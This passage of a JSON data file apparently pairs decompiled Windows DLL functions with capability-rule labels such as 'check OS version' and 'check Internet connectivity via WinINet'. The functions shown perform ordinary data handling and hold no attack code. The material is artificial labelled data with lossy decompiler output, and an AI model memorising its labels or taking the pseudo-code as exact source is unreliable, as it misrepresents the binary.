        "decompiled_code": "\nulong fcn.180044910(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    ulong *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char in_DL;\n    int64_t *piVar6;\n    ulong *arg2;\n    int64_t arg2_00;\n    int64_t iVar7;\n    int64_t iVar8;\n    \n    if (*(arg1 + 0x53) != '\\0') {\n        return 0;\n    }\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if ((iVar3 != -1) && (iVar4 = (**0x1800de7f0)(*(arg1 + 0x68), 0x188, 0, 0),  iVar4 != -1)) {\n        iVar8 = iVar4;\n        arg2_00 = iVar8 * 0x60 + *(iVar3 * 0x60 + 0x48 + *(arg1 + 0xc0));\n        if (in_DL == '\\0') {\n            if (*(arg2_00 + 0x30) == 0) {\n                fcn.180044dd0(arg1);\n                return 0;\n            }\n            fcn.180044240(arg1, arg2_00);\n        }\n        else {\n            iVar3 = (**0x1800de7f0)(*(arg1 + 0x70), 0x147, 0, 0);\n            iVar7 = *(arg1 + 0xa8);\n            if (*(arg1 + 0xb0) - iVar7 >> 6 <= iVar3) {\n                return 0xffffffff;\n            }\n            piVar6 = iVar3 * 0x40 + iVar7;\n            if (arg2_00 != piVar6) {\n                piVar1 = piVar6 + 2;\n                if (0xf < piVar6[3]) {\n                    piVar6 = *piVar6;\n                }\n                fcn.180011120(arg2_00, piVar6, *piVar1);\n                iVar7 = *(arg1 + 0xa8);\n            }\n            arg2 = iVar3 * 0x40 + 0x20 + iVar7;\n            if (arg2_00 + 0x20 != arg2) {\n                puVar2 = arg2 + 2;\n                if (7 < arg2[3]) {\n                    arg2 = *arg2;\n                }\n                fcn.180010d70(arg2_00 + 0x20, arg2, *puVar2);\n            }\n            uVar5 = (**0x1800de6e8)(*(arg1 + 0x18), 0x27f4, 0, 0);\n            *(arg2_00 + 0x40) = uVar5;\n            iVar3 = (**0x1800de740)(*(arg1 + 0x18), 0x27f5);\n            *(arg2_00 + 0x44) = iVar3 == 1;\n        }\n        (**0x1800de7f0)(*(arg1 + 0x68), 0x182, iVar8, 0);\n        piVar6 = arg2_00 + 0x20;\n        if (7 < *(arg2_00 + 0x38)) {\n            piVar6 = *piVar6;\n        }\n        (**0x1800de7f0)(*(arg1 + 0x68), 0x181, iVar8, piVar6);\n        (**0x1800de7f0)(*(arg1 + 0x68), 0x186, iVar8, 0);\n        *(arg1 + 0x51) = 0;\n        *(arg1 + 0x53) = 1;\n        fcn.180044430(arg1);\n        return 1;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 883
    },
    "180044fa": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180044fa0(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    ulong arg2;\n    ulong *arg2_00;\n    uchar *puVar7;\n    int64_t arg2_01;\n    ushort *puVar8;\n    uchar auStack184 [32];\n    uchar uStack152;\n    unkbyte7 Stack151;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    ushort uStack120;\n    unkbyte6 Stack118;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint32_t uStack88;\n    ulong uStack80;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint64_t uStack56;\n    \n    uStack56 = *0x180123080 ^ auStack184;\n    arg2 = 0x188;\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if (iVar3 == -1) {\n        puVar7 = &uStack152;\n        uStack136 = *0x180101910;\n        uStack132 = *0x180101914;\n        uStack128 = *0x180101918;\n        uStack124 = *0x18010191c;\n        uStack72 = 0;\n        uStack68 = 0;\n        uStack64 = 0;\n        uStack60 = 0;\n        uStack152 = 0;\n        uStack104 = *0x180101900;\n        uStack100 = *0x180101904;\n        uStack96 = *0x180101908;\n        uStack92 = *0x18010190c;\n        uStack120 = 0;\n        uStack88 = uStack88 & 0xffffff00;\n        uStack80 = 0;\n        fcn.180048db0(&uStack80, arg2);\n        fcn.180042e30(&uStack152);\n    }\n    else {\n        puVar7 = iVar3 * 0x60 + *(arg1 + 0xc0);\n    }\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x70), 0x147, 0, 0);\n    iVar4 = (**0x1800de6e8)(*(arg1 + 0x18), 0x27f4, 0, 0);\n    iVar5 = (**0x1800de740)(*(arg1 + 0x18), 0x27f5);\n    (**0x1800de7f0)(*(arg1 + 0x78), 0x184, 0, 0);\n    iVar2 = *(puVar7 + 0x50);\n    arg2_01 = *(puVar7 + 0x48);\n    if (arg2_01 != iVar2) {\n        do {\n            fcn.180043fe0(&uStack152, arg2_01);\n            if (CONCAT44(uStack100, uStack104) != 0) {\n                if (iVar5 == 1) {\n                    arg2_00 = iVar3 * 0x40 + *(arg1 + 0xa8);\n                    piVar1 = arg2_00 + 2;\n                    if (0xf < arg2_00[3]) {\n                        arg2_00 = *arg2_00;\n                    }\n                    puVar7 = &uStack152;\n                    if (0xf < CONCAT44(uStack124, uStack128)) {\n                        puVar7 = CONCAT71(Stack151, uStack152);\n                    }\n                    if (CONCAT44(uStack132, uStack136) == *piVar1) {\n                        iVar6 = fcn.1800ae4d0(puVar7, arg2_00, CONCAT44(uStack132, uStack136));\n                        if (iVar6 == 0) goto code_r0x000180045146;\n                    }\n                }\n                if (uStack88 <= iVar4 - (iVar5 == 1)) {\n                    puVar8 = &uStack120;\n                    if (7 < CONCAT44(uStack92, uStack96)) {\n                        puVar8 = CONCAT62(Stack118, uStack120);\n                    }\n                    (**0x1800de7f0)(*(arg1 + 0x78), 0x180, 0, puVar8);\n                }\n            }\ncode_r0x000180045146:\n            fcn.180048ec0(&uStack80);\n            fcn.180042e30(&uStack152);\n            arg2_01 = arg2_01 + 0x60;\n        } while (arg2_01 != iVar2);\n    }\n    (**0x1800de7f0)(*(arg1 + 0x78), 0x180, 0, L\"<End of File>\");\n    fcn.18008fb00(uStack56 ^ auStack184);\n    return;\n}\n",
        "token_count": 1150
    },
    "18004573": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.180045730(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    ulong *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char in_DL;\n    int64_t *piVar6;\n    ulong *arg2;\n    int64_t iVar7;\n    int64_t arg1_00;\n    int64_t iVar8;\n    \n    if (*(arg1 + 0x54) != '\\0') {\n        return 0;\n    }\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if (((iVar3 != -1) && (iVar4 = (**0x1800de7f0)(*(arg1 + 0x68), 0x188, 0, 0),  iVar4 != -1)) &&\n       (iVar5 = (**0x1800de7f0)(*(arg1 + 0x80), 0x188, 0, 0),  iVar5 != -1)) {\n        iVar7 = iVar5;\n        arg1_00 = iVar7 * 0x40 + *(*(iVar3 * 0x60 + 0x48 + *(arg1 + 0xc0)) + 0x48 + iVar4 * 0x60);\n        if (in_DL == '\\0') {\n            if (*(arg1_00 + 0x30) == 0) {\n                fcn.180045b30(arg1);\n                return 0;\n            }\n            fcn.180045360(arg1);\n        }\n        else {\n            iVar3 = (**0x1800de7f0)(*(arg1 + 0x88), 0x147, 0, 0);\n            iVar8 = *(arg1 + 0xa8);\n            if (*(arg1 + 0xb0) - iVar8 >> 6 <= iVar3) {\n                return 0xffffffff;\n            }\n            piVar6 = iVar3 * 0x40 + iVar8;\n            if (arg1_00 != piVar6) {\n                piVar1 = piVar6 + 2;\n                if (0xf < piVar6[3]) {\n                    piVar6 = *piVar6;\n                }\n                fcn.180011120(arg1_00, piVar6, *piVar1);\n                iVar8 = *(arg1 + 0xa8);\n            }\n            arg2 = iVar3 * 0x40 + 0x20 + iVar8;\n            if (arg1_00 + 0x20 != arg2) {\n                puVar2 = arg2 + 2;\n                if (7 < arg2[3]) {\n                    arg2 = *arg2;\n                }\n                fcn.180010d70(arg1_00 + 0x20, arg2, *puVar2);\n            }\n        }\n        (**0x1800de7f0)(*(arg1 + 0x80), 0x182, iVar7, 0);\n        piVar6 = arg1_00 + 0x20;\n        if (7 < *(arg1_00 + 0x38)) {\n            piVar6 = *piVar6;\n        }\n        (**0x1800de7f0)(*(arg1 + 0x80), 0x181, iVar7, piVar6);\n        (**0x1800de7f0)(*(arg1 + 0x80), 0x186, iVar7, 0);\n        *(arg1 + 0x51) = 0;\n        *(arg1 + 0x54) = 1;\n        fcn.1800455a0(arg1);\n        return 1;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 838
    },
    "18004646": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_30h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180046460(int64_t arg1, ulong *arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    uint32_t *puVar4;\n    uint *puVar5;\n    uchar *puVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    ulong *puVar9;\n    int64_t iVar10;\n    uint64_t uVar11;\n    uint32_t uVar12;\n    ulong var_50h;\n    ulong var_60h;\n    ulong var_68h;\n    ulong var_70h;\n    ulong var_78h;\n    ulong var_80h;\n    ulong var_88h;\n    ulong var_98h;\n    ulong var_a0h;\n    ulong var_b0h;\n    ulong var_c0h;\n    ulong var_c8h;\n    ulong var_d0h;\n    ulong var_e0h;\n    ulong var_e8h;\n    ulong var_f0h;\n    ulong var_f8h;\n    ulong var_100h;\n    ulong var_130h;\n    uchar auStack632 [32];\n    uchar *puStack600;\n    uchar *puStack592;\n    int32_t iStack584;\n    uchar uStack576;\n    unkbyte7 Stack575;\n    ulong uStack560;\n    uint64_t uStack552;\n    uchar uStack544;\n    uchar uStack543;\n    unkbyte6 Stack542;\n    ulong uStack528;\n    uint64_t uStack520;\n    uchar uStack512;\n    unkbyte7 Stack511;\n    ulong uStack496;\n    uint64_t uStack488;\n    int32_t iStack480;\n    uchar *puStack472;\n    uchar auStack464 [32];\n    ulong uStack432;\n    uchar auStack424 [128];\n    ushort uStack296;\n    ushort uStack294;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    int64_t iStack280;\n    uint64_t uStack272;\n    uchar auStack264 [16];\n    int64_t iStack248;\n    uint32_t uStack240;\n    uint32_t uStack236;\n    uint32_t uStack232;\n    uint32_t uStack228;\n    uint64_t uStack224;\n    uint64_t uStack216;\n    uchar auStack200 [16];\n    ulong uStack184;\n    ulong uStack176;\n    ushort uStack168;\n    ulong uStack152;\n    ulong uStack144;\n    uchar uStack136;\n    ulong var_78h_2;\n    ulong var_70h_2;\n    ulong var_68h_2;\n    ulong var_60h_2;\n    ulong var_bp_58h;\n    uint64_t uStack72;\n    ulong var_38h;\n    ulong var_bp_30h;\n    uint64_t uVar13;\n    \n    uStack432 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack632;\n    auStack264 = ZEXT816(0);\n    uVar8 = 0;\n    iStack248 = 0;\n    uStack224 = 0;\n    uVar11 = 0xf;\n    uStack216 = 0xf;\n    uStack240 = uStack240 & 0xffffff00;\n    iStack280 = 0;\n    uStack272 = 7;\n    uStack296 = 0;\n    uVar3 = fcn.1800687b0(auStack200);\n    puVar9 = arg2;\n    if (7 < arg2[3]) {\n        puVar9 = *arg2;\n    }\n    fcn.180068c50(uVar3, &uStack544, puVar9, puVar9 + arg2[2] * 2);\n    puVar6 = auStack200;\n    fcn.1800686c0(puVar6);\n    iStack480 = fcn.180008fa0(puVar6, auStack264, &uStack544);\n    iStack584 = 0;\n    uVar13 = uVar8;\n    if (0 < iStack480) {\n        do {\n            puStack472 = auStack464;\n            uVar3 = fcn.1800687b0(auStack424);\n            puVar9 = arg2;\n            if (7 < arg2[3]) {\n                puVar9 = *arg2;\n            }\n            fcn.180068c50(uVar3, auStack464, puVar9, puVar9 + arg2[2] * 2);\n            fcn.1800686c0(auStack424);\n            uStack496 = 0;\n            uStack488 = 0xf;\n            uStack512 = 0;\n            fcn.180011120(&uStack512, 0x1800f478b, 0);\n            uStack560 = 0;\n            uStack552 = 0xf;\n            uStack576 = 0;\n            puVar6 = &uStack576;\n            fcn.180011120(puVar6, 0x1800f8430, 8);\n            iVar10 = uVar13 * 0x20;\n            puStack592 = auStack464;\n            puStack600 = &uStack512;\n            puVar4 = fcn.180004b90(puVar6, &uStack544, auStack264._0_8_ + iVar10, &uStack576);\n            if (&uStack240 != puVar4) {\n                if (0xf < uVar11) {\n                    iVar2 = CONCAT44(uStack236, uStack240);\n                    iVar7 = iVar2;\n                    if ((0xfff < uVar11 + 1) && (iVar7 = *(iVar2 + -8),  0x1f < (iVar2 - iVar7) - 8U))\n                    goto code_r0x000180046c16;\n                    fcn.18008fb24(iVar7);\n                }\n                uStack240 = *puVar4;\n                uStack236 = puVar4[1];\n                uStack232 = puVar4[2];\n                uStack228 = puVar4[3];\n                uVar8 = *(puVar4 + 4);\n                uVar11 = *(puVar4 + 6);\n                *(puVar4 + 4) = 0;\n                *(puVar4 + 6) = 0xf;\n                *puVar4 = 0;\n                uStack224 = uVar8;\n                uStack216 = uVar11;\n            }\n            if (0xf < uStack520) {\n                iVar2 = CONCAT62(Stack542, CONCAT11(uStack543, uStack544));\n                iVar7 = iVar2;\n                if ((0xfff < uStack520 + 1) && (iVar7 = *(iVar2 + -8),  0x1f < (iVar2 - iVar7) - 8U))\n                goto code_r0x000180046c16;\n                fcn.18008fb24(iVar7);\n            }\n            uStack528 = 0;\n            uStack520 = 0xf;\n            uStack544 = 0;\n            if (0xf < uStack552) {\n                iVar2 = CONCAT71(Stack575, uStack576);\n                iVar7 = iVar2;\n                if ((0xfff < uStack552 + 1) && (iVar7 = *(iVar2 + -8),  0x1f < (iVar2 - iVar7) - 8U))\n                goto code_r0x000180046c1c;\n                fcn.18008fb24(iVar7);\n            }\n            uStack560 = 0;\n            uStack552 = 0xf;\n            uStack576 = 0;\n            if (0xf < uStack488) {\n                iVar2 = CONCAT71(Stack511, uStack512);\n                iVar7 = iVar2;\n                if ((0xfff < uStack488 + 1) && (iVar7 = *(iVar2 + -8),  0x1f < (iVar2 - iVar7) - 8U))\n                goto code_r0x000180046c22;\n                fcn.18008fb24(iVar7);\n            }\n            if (uVar8 != 0) {\n                puStack472 = auStack464;\n                uVar3 = fcn.1800687b0(auStack424);\n                puVar9 = arg2;\n                if (7 < arg2[3]) {\n                    puVar9 = *arg2;\n                }\n                fcn.180068c50(uVar3, auStack464, puVar9, puVar9 + arg2[2] * 2);\n                fcn.1800686c0(auStack424);\n                uStack496 = 0;\n                uStack488 = 0xf;\n                uStack512 = 0;\n                fcn.180011120(&uStack512, 0x1800f478e, 0);\n                uStack560 = 0;\n                uStack552 = 0xf;\n                uStack576 = 0;\n                puVar6 = &uStack576;\n                fcn.180011120(puVar6, 0x1800f8450, 9);\n                puStack592 = auStack464;\n                puStack600 = &uStack512;\n                puVar5 = fcn.180004f50(puVar6, &uStack544, auStack264._0_8_ + iVar10, &uStack576);\n                if (&uStack296 != puVar5) {\n                    if (7 < uStack272) {\n                        iVar2 = CONCAT44(uStack292, CONCAT22(uStack294, uStack296));\n                        iVar7 = iVar2;\n                        if ((0xfff < uStack272 * 2 + 2) && (iVar7 = *(iVar2 + -8),  0x1f < (iVar2 - iVar7) - 8U))\n                        goto code_r0x000180046c28;\n                        fcn.18008fb24(iVar7);\n                    }\n                    uStack292 = puVar5[1];\n                    uStack288 = puVar5[2];\n                    uStack284 = puVar5[3];\n                    uStack296 = *puVar5;\n                    uStack294 = *puVar5 >> 0x10;\n                    iStack280 = *(puVar5 + 4);\n                    uStack272 = *(puVar5 + 6);\n                    *(puVar5 + 4) = 0;\n                    *(puVar5 + 6) = 7;\n                    *puVar5 = 0;\n                }\n                if (7 < uStack520) {\n                    iVar2 = CONCAT62(Stack542, CONCAT11(uStack543, uStack544));\n                    iVar7 = iVar2;\n                    if ((0xfff < uStack520 * 2 + 2) && (iVar7 = *(iVar2 + -8),  0x1f < (iVar2 - iVar7) - 8U))\n                    goto code_r0x000180046c28;\n                    fcn.18008fb24(iVar7);\n                }\n                uStack528 = 0;\n                uStack520 = 7;\n                uStack544 = 0;\n                uStack543 = 0;\n                if (0xf < uStack552) {\n                    iVar2 = CONCAT71(Stack575, uStack576);\n                    iVar7 = iVar2;\n                    if ((0xfff < uStack552 + 1) && (iVar7 = *(iVar2 + -8),  0x1f < (iVar2 - iVar7) - 8U))\n                    goto code_r0x000180046c2e;\n                    fcn.18008fb24(iVar7);\n                }\n                uStack560 = 0;\n                uStack552 = 0xf;\n                uStack576 = 0;\n                if (0xf < uStack488) {\n                    iVar2 = CONCAT71(Stack511, uStack512);\n                    iVar7 = iVar2;\n                    if ((0xfff < uStack488 + 1) && (iVar7 = *(iVar2 + -8),  0x1f < (iVar2 - iVar7) - 8U))\n                    goto code_r0x000180046c34;\n                    fcn.18008fb24(iVar7);\n                }\n                if (iStack280 != 0) {\n                    uStack184 = 0;\n                    uStack176 = 0xf;\n                    auStack200[0] = 0;\n                    uStack152 = 0;\n                    uStack144 = 7;\n                    uStack168 = 0;\n                    uStack136 = 0;\n                    var_78h_2 = 0;\n                    _var_70h_2 = ZEXT816(0);\n                    iVar7 = *(arg1 + 200);\n                    if (iVar7 == *(arg1 + 0xd0)) {\n                        fcn.1800490a0(arg1 + 0xc0, iVar7, auStack200);\n                    }\n                    else {\n                        fcn.1800434a0(iVar7, auStack200);\n                        *(arg1 + 200) = *(arg1 + 200) + 0x60;\n                    }\n                    uVar3 = fcn.18000de50(auStack464, auStack264._0_8_ + iVar10);\n                    fcn.180041a10(arg1, (*(arg1 + 200) - *(arg1 + 0xc0)) / 0x60 - 1, uVar3, arg2);\n                    puVar5 = &uStack296;\n                    if (7 < uStack272) {\n                        puVar5 = CONCAT44(uStack292, CONCAT22(uStack294, uStack296));\n                    }\n                    uVar3 = 0x180;\n                    (**0x1800de7f0)(*(arg1 + 0x58), 0x180, 0, puVar5);\n                    iStack584 = iStack584 + 1;\n                    fcn.180048db0(&var_78h_2, uVar3);\n                    fcn.180042e30(auStack200);\n                }\n            }\n            uVar12 = uVar13 + 1;\n            uVar13 = uVar12;\n        } while (uVar12 < iStack480);\n    }\n    (**0x1800de7f0)(*(arg1 + 0x58), 0x186, (*(arg1 + 200) - *(arg1 + 0xc0)) / 0x60 + -1, 0);\n    fcn.180042d50(arg1);\n    *(arg1 + 0x51) = 0;\n    fcn.180043070(arg1);\n    if (uStack272 < 8) {\ncode_r0x000180046b47:\n        iStack280 = 0;\n        uStack272 = 7;\n        uStack296 = 0;\n        if (0xf < uVar11) {\n            iVar7 = CONCAT44(uStack236, uStack240);\n            iVar10 = iVar7;\n            if ((0xfff < uVar11 + 1) && (iVar10 = *(iVar7 + -8),  0x1f < (iVar7 - iVar10) - 8U))\n            goto code_r0x000180046c3a;\n            fcn.18008fb24(iVar10);\n        }\n        if (auStack264._0_8_ == 0) goto code_r0x000180046bde;\n        fcn.180013b30(auStack264._0_8_, auStack264._8_8_);\n        uVar8 = iStack248 - auStack264._0_8_ & 0xffffffffffffffe0;\n        iVar10 = auStack264._0_8_;\n        if (0xfff < uVar8) {\n            iVar10 = *(auStack264._0_8_ + -8);\n            if (0x1f < (auStack264._0_8_ - iVar10) - 8U) {\n                fcn.1800b3528(iVar10, uVar8 + 0x27);\n                goto code_r0x000180046c10;\n            }\n        }\n        fcn.18008fb24(iVar10);\ncode_r0x000180046bde:\n        fcn.18008fb00(uStack72 ^ auStack632);\n        return;\n    }\n    iVar7 = CONCAT44(uStack292, CONCAT22(uStack294, uStack296));\n    iVar10 = iVar7;\n    if ((uStack272 * 2 + 2 < 0x1000) || (iVar10 = *(iVar7 + -8),  (iVar7 - iVar10) - 8U < 0x20)) {\n        fcn.18008fb24(iVar10);\n        goto code_r0x000180046b47;\n    }\ncode_r0x000180046c10:\n    fcn.1800b3528();\ncode_r0x000180046c16:\n    fcn.1800b3528();\ncode_r0x000180046c1c:\n    fcn.1800b3528();\ncode_r0x000180046c22:\n    fcn.1800b3528();\ncode_r0x000180046c28:\n    fcn.1800b3528();\ncode_r0x000180046c2e:\n    fcn.1800b3528();\ncode_r0x000180046c34:\n    fcn.1800b3528();\ncode_r0x000180046c3a:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 3889
    },
    "180046c4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h_2\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_bp_30h\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180046c40(int64_t arg1, int64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    int64_t *piVar1;\n    uint64_t uVar2;\n    code *pcVar3;\n    uchar auVar4 [12];\n    ulong ******ppppppuVar5;\n    ulong uVar6;\n    int64_t *piVar7;\n    int64_t **ppiVar8;\n    uint *puVar9;\n    uchar (*pauVar10) [16];\n    ulong *******pppppppuVar11;\n    uint *puVar12;\n    ushort *puVar13;\n    int16_t *arg2_00;\n    ulong *puVar14;\n    ushort *puVar15;\n    ulong ******ppppppuVar16;\n    ushort *puVar17;\n    ulong *******pppppppuVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    int64_t **ppiVar21;\n    int64_t iVar22;\n    int64_t iVar23;\n    ulong *puVar24;\n    uint64_t uVar25;\n    uint64_t uVar26;\n    ulong *puVar27;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar extraout_XMM0_01 [16];\n    uchar extraout_XMM0_02 [16];\n    uchar extraout_XMM0_03 [16];\n    uchar extraout_XMM0_04 [16];\n    uchar extraout_XMM0_05 [16];\n    uchar extraout_XMM0_06 [16];\n    uchar extraout_XMM0_07 [16];\n    uchar extraout_XMM0_08 [16];\n    uchar extraout_XMM0_09 [16];\n    uchar extraout_XMM0_10 [16];\n    uchar extraout_XMM0_11 [16];\n    uchar extraout_XMM0_12 [16];\n    uchar extraout_XMM0_13 [16];\n    uchar extraout_XMM0_14 [16];\n    uchar extraout_XMM0_15 [16];\n    uchar extraout_XMM0_16 [16];\n    uchar extraout_XMM0_17 [16];\n    uchar extraout_XMM0_18 [16];\n    uchar extraout_XMM0_19 [16];\n    uchar extraout_XMM0_20 [16];\n    uchar extraout_XMM0_21 [16];\n    uchar auVar28 [16];\n    ulong var_8h;\n    ulong var_10h_2;\n    ulong var_18h_2;\n    ulong var_28h_2;\n    ulong var_40h;\n    ulong var_bp_50h;\n    ulong var_58h;\n    ulong var_60h;\n    ulong var_70h;\n    ulong var_78h;\n    ulong var_80h;\n    ulong var_88h;\n    ulong var_98h;\n    ulong var_a0h;\n    ulong var_a8h;\n    ulong var_b8h;\n    ulong var_c0h;\n    ulong var_c8h;\n    ulong var_d8h;\n    ulong var_e0h;\n    ulong var_e8h;\n    ulong var_f0h;\n    ulong var_f8h;\n    ulong var_100h;\n    ulong var_110h;\n    ulong var_120h;\n    ulong var_128h;\n    ulong var_148h;\n    ulong var_170h;\n    ulong var_1f0h;\n    ulong var_200h;\n    ulong var_208h;\n    ulong var_210h;\n    ulong var_220h;\n    ulong var_228h;\n    ulong var_230h;\n    ulong var_240h;\n    ulong var_248h;\n    ulong var_250h;\n    ulong var_260h;\n    ulong var_268h;\n    ulong var_270h;\n    ulong var_280h;\n    ulong var_288h;\n    ulong var_290h;\n    ulong var_2a8h;\n    uchar auStack1000 [32];\n    uint64_t uStack968;\n    uint32_t uStack952;\n    ulong uStack944;\n    uint uStack936;\n    uint uStack932;\n    uchar auStack928 [16];\n    uint uStack912;\n    uint uStack908;\n    uint uStack904;\n    uint uStack900;\n    uchar auStack896 [16];\n    ulong uStack880;\n    uint uStack872;\n    uint uStack868;\n    uchar auStack864 [16];\n    ulong uStack848;\n    uint uStack840;\n    uint uStack836;\n    uchar auStack832 [16];\n    ulong uStack816;\n    uint uStack808;\n    uint uStack804;\n    uchar auStack800 [16];\n    ulong uStack784;\n    uint uStack776;\n    uint uStack772;\n    uchar auStack768 [16];\n    ulong uStack752;\n    uint uStack744;\n    uint uStack740;\n    uchar auStack736 [16];\n    ulong uStack720;\n    uint uStack712;\n    uint uStack708;\n    uchar auStack704 [16];\n    uint32_t uStack688;\n    ulong uStack680;\n    uint uStack672;\n    uint uStack668;\n    uchar auStack664 [16];\n    uchar auStack648 [16];\n    uchar auStack632 [16];\n    uint64_t uStack616;\n    ulong *******pppppppuStack608;\n    int64_t iStack600;\n    uchar auStack592 [16];\n    ushort uStack576;\n    unkbyte6 Stack574;\n    uint uStack560;\n    uint uStack556;\n    uint uStack552;\n    uint uStack548;\n    ulong *******pppppppuStack544;\n    int64_t iStack536;\n    uint64_t uStack528;\n    uint64_t uStack520;\n    ulong *puStack512;\n    ulong uStack504;\n    int64_t iStack496;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uint uStack476;\n    uchar auStack472 [16];\n    ulong uStack456;\n    uchar auStack448 [32];\n    uchar auStack416 [40];\n    uchar auStack376 [128];\n    ushort uStack248;\n    unkbyte6 Stack246;\n    uint64_t uStack232;\n    uint64_t uStack224;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uchar auStack200 [16];\n    ulong uStack184;\n    uint uStack176;\n    uint uStack172;\n    uchar auStack168 [16];\n    ushort uStack152;\n    unkbyte6 Stack150;\n    uint64_t uStack136;\n    uint64_t var_78h_2;\n    ulong var_70h_2;\n    ulong var_bp_68h;\n    uint64_t uStack104;\n    uint64_t var_58h_2;\n    int16_t aiStack88 [4];\n    ulong var_bp_48h;\n    uint64_t var_bp_38h;\n    ulong var_bp_30h;\n    ulong var_28h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h_2;\n    \n    uStack456 = 0xfffffffffffffffe;\n    var_bp_38h = *0x180123080 ^ auStack1000;\n    uVar19 = 0;\n    uStack952 = 0;\n    puVar24 = arg2 * 0x60 + *(arg1 + 0xc0);\n    uStack232 = 0;\n    uStack224 = 7;\n    uStack248 = 0;\n    puStack512 = puVar24;\n    uStack504 = arg4;\n    iStack496 = arg2;\n    fcn.180010d70(&uStack248, 0x1800f822c, 2);\n    uStack104 = 0;\n    var_58h_2 = 7;\n    var_70h_2._0_2_ = 0;\n    uStack136 = 0;\n    var_78h_2 = 7;\n    uStack152 = 0;\n    uStack616 = 0;\n    iVar22 = puVar24[9];\n    iVar23 = puVar24[10] - iVar22 >> 0x3f;\n    if ((puVar24[10] - iVar22) / 0x60 + iVar23 != iVar23) {\n        do {\n            uVar25 = 0;\n            puVar27 = uStack616 * 0x60 + iVar22;\n            uVar6 = fcn.1800687b0(auStack376);\n            puVar24 = puVar27;\n            if (0xf < puVar27[3]) {\n                puVar24 = *puVar27;\n            }\n            fcn.180069050(uVar6, &uStack184, puVar24, puVar27[2] + puVar24);\n            uVar19 = uVar19 | 3;\n            uStack688 = uVar19;\n            fcn.1800686c0(auStack376);\n            auStack200 = CONCAT88(7, SUB168(auStack200, 0));\n            uStack216._0_2_ = 0;\n            iVar22 = puVar27[9];\n            uVar26 = uVar25;\n            if (puVar27[10] - iVar22 >> 6 != 0) {\n                do {\n                    iVar23 = -1;\n                    puVar24 = iVar22 + uVar26;\n                    uVar6 = fcn.1800687b0(auStack376);\n                    puVar14 = puVar24;\n                    if (0xf < puVar24[3]) {\n                        puVar14 = *puVar24;\n                    }\n                    puVar13 = &uStack576;\n                    fcn.180069050(uVar6, puVar13, puVar14, puVar24[2] + puVar14);\n                    fcn.1800686c0(auStack376);\n                    iVar22 = 0x1800f7504;\n                    if (uVar25 == 0) {\n                        iVar22 = 0x1800f74dc;\n                    }\n                    do {\n                        iVar23 = iVar23 + 1;\n                    } while (*(iVar22 + iVar23 * 2) != 0);\n                    piVar7 = fcn.180014b80(&uStack576, puVar13, iVar22, iVar23);\n                    pppppppuVar11 = *piVar7;\n                    iStack600 = piVar7[1];\n                    uVar2 = **(piVar7 + 2);\n                    auStack592._8_8_ = piVar7[3];\n                    auStack592 = *(piVar7 + 2);\n                    piVar7[2] = 0;\n                    piVar7[3] = 7;\n                    *piVar7 = 0;\n                    uVar19 = uVar19 | 0x1c;\n                    pppppppuVar18 = &pppppppuStack608;\n                    if (7 < auStack592._8_8_) {\n                        pppppppuVar18 = pppppppuVar11;\n                    }\n                    uStack688 = uVar19;\n                    pppppppuStack608 = pppppppuVar11;\n                    if (auStack200._8_8_ - auStack200._0_8_ < uVar2) {\n                    